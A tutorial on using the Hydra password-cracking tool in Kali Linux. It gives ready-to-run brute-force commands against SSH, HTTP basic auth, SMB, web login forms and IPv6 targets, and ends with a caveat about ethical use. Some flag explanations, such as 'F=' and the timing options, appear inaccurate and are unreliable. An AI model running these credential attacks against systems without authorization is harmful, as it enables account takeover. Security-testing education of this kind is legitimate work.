Hydra Tool in Kali Linux

Hydra is a popular password-cracking tool found in Kali Linux, used for brute-force attacks on various protocols to test the strength of passwords and login security. It supports a wide range of protocols, including HTTP, FTP, SSH, Telnet, SMB, and many more. Hydra can attempt login/password combinations quickly and efficiently, making it a go-to tool for penetration testers and security enthusiasts.

Basics of Hydra

Syntax

The basic syntax for Hydra looks like this:

hydra [options] [target] [module]
  • [options] include various configurations like username lists, password lists, timeouts, etc.
  • [target] is the IP address or hostname of the machine being targeted.
  • [module] specifies the protocol (e.g., SSH, FTP, HTTP, etc.).

Simple Example

Here's a simple example of using Hydra to brute-force an SSH login:

hydra -l admin -P /path/to/password_list.txt ssh://192.168.1.100

In this example:

  • -l admin: specifies the username admin.
  • -P /path/to/password_list.txt: specifies the password list to use.
  • ssh://192.168.1.100: targets the IP 192.168.1.100 for SSH brute-forcing.

Important Flags and Options:

  • -l [username]: Specifies a single username.
  • -L [username_list]: Specifies a file with multiple usernames.
  • -p [password]: Specifies a single password.
  • -P [password_list]: Specifies a file with multiple passwords.
  • -f: Stops after the first successful login.
  • -V: Verbose output, showing each login attempt.
  • -t [number]: Sets the number of parallel tasks or threads. For example, -t 4 runs 4 tasks in parallel.
  • -s [port]: Specifies a non-default port for the target service.

Example Commands from Basic to Advanced

1. Basic SSH Attack

Brute-forcing SSH with a username and password list:

hydra -l root -P /path/to/password_list.txt ssh://192.168.1.10

2. Brute-Force HTTP Authentication

To attack a web server using HTTP basic authentication:

hydra -l admin -P /path/to/password_list.txt http-get://192.168.1.10

3. Attacking with Username and Password Lists

If you want to try different usernames and passwords:

hydra -L /path/to/username_list.txt -P /path/to/password_list.txt ssh://192.168.1.10

4. Stopping After First Match

You can stop Hydra after the first successful login by using the -f flag:

hydra -L /path/to/username_list.txt -P /path/to/password_list.txt ssh://192.168.1.10 -f

5. Increasing the Number of Threads

You can speed up the attack by increasing the number of parallel tasks (threads) with the -t flag:

hydra -L /path/to/username_list.txt -P /path/to/password_list.txt -t 8 ssh://192.168.1.10

6. Attack a Custom Port

If the service is running on a non-default port, you can specify it with the -s flag:

hydra -l admin -P /path/to/password_list.txt -s 2222 ssh://192.168.1.10

7. Brute-Forcing an SMB Service

If you're targeting an SMB (Windows File Sharing) service:

hydra -L /path/to/username_list.txt -P /path/to/password_list.txt smb://192.168.1.10

8. Attack on HTTP POST Form

If you're trying to attack a login form on a website using POST requests, you'd need to specify the form fields:

hydra -L usernames.txt -P passwords.txt 192.168.1.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"

In this example:

  • ^USER^ and ^PASS^ are placeholders that Hydra will replace with the current username and password from the list.
  • F=incorrect tells Hydra to stop when the "incorrect" string is found in the response.

9. Saving Results to a File

You can save successful attempts to a file using the -o option:

hydra -L usernames.txt -P passwords.txt ssh://192.168.1.10 -o results.txt

10. Advanced Timing Options

You can control timing by specifying delays between attempts or the maximum number of retries:

  • -w [seconds]: Adds a delay between retries.
  • -W [retries]: Sets the number of retries for a failed connection.

For example:

hydra -L usernames.txt -P passwords.txt -t 8 -w 2 -W 3 ssh://192.168.1.10

11. Hydra GUI

Kali Linux also includes a graphical interface for Hydra called X-Hydra. To open it, type xhydra in your terminal. This interface allows you to configure attacks more easily if you're not comfortable with command-line options.

12. IPv6 Support

Hydra supports IPv6 as well. You can specify an IPv6 address as a target using the -6 flag.

hydra -6 -L usernames.txt -P passwords.txt ssh://[fe80::1ff:fe23:4567:890a]

Things to Remember:

  • Ethical Use: Hydra should be used for ethical purposes only, such as penetration testing or security auditing, and only with permission.
  • Resource-Intensive: Brute-force attacks can be resource-intensive, both for your machine and the target system.
  • Lockout Policies: Many systems have lockout policies after a number of failed login attempts, so brute-forcing might be ineffective on such systems.

Hydra is a powerful tool, and when used appropriately, it can help identify weak credentials in a variety of services.
